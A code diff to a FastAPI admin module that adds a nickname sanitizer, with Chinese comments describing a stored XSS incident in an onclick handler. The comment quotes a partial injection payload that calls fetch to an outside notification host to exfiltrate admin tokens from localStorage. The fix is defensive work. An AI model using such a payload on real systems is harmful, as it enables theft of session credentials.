@@ -3,6 +3,7 @@ import base64
 import hashlib
 import hmac
 import os
+import re
 from datetime import datetime, timedelta
 
 import jwt
@@ -11,6 +12,39 @@ from fastapi import Header, HTTPException, Request
 from admin.config import settings
 from admin.db import SessionLocal
 from admin.models import ApiKey
+
+
+# ---------------------------------------------------------------------------
+# 展示名清洗（账号昵称来自上游/用户输入，最终会进后台 HTML）
+# ---------------------------------------------------------------------------
+#
+# 事故背景：账号昵称直接来自上游 profile.nickname（提交者自己可控），
+# 后台账号行把它拼进 `onclick="fn('${esc(name)}')"`。`esc()` 只做 HTML 实体
+# 转义（& < > "），**不处理单引号**；而 onclick 属性的值是「先 HTML 解码、
+# 再当 JS 解析」，所以昵称里一个 `'` 就能闭合字符串、跳出参数位执行任意 JS
+# （实测被注入 `');fetch('//ntfy.sh/xxx',...)//` 偷 localStorage 里的后台令牌）。
+#
+# 前端已改为 `jsv()`（JSON.stringify + esc）做正确编码；这里再加一道
+# **入库侧白名单**：昵称不该包含任何 HTML/JS 元字符。两层同时存在的好处是
+# 以后任何新写的渲染点即使漏了转义，库里的数据本身也不带 payload。
+_DISPLAY_NAME_MAX = 64
+_DISPLAY_NAME_BAD = re.compile(r"[<>&\"'`\\\x00-\x1f\x7f]")
+
+
+def clean_display_name(value, fallback: str = "") -> str:
+    """把任意输入收敛成一个「只能当纯文本展示」的名字。
+
+    * 去掉 HTML/JS 元字符与所有控制字符（含换行，避免多行注入）
+    * 压掉首尾空白，超长截断
+    * 结果为空则回落到 fallback
+    """
+    if not isinstance(value, str):
+        return fallback
+    s = _DISPLAY_NAME_BAD.sub("", value).strip()
+    s = s[:_DISPLAY_NAME_MAX].strip()
+    if s.lower() in ("null", "none", "undefined"):
+        return fallback
+    return s or fallback
 
 
 # ---------------------------------------------------------------------------
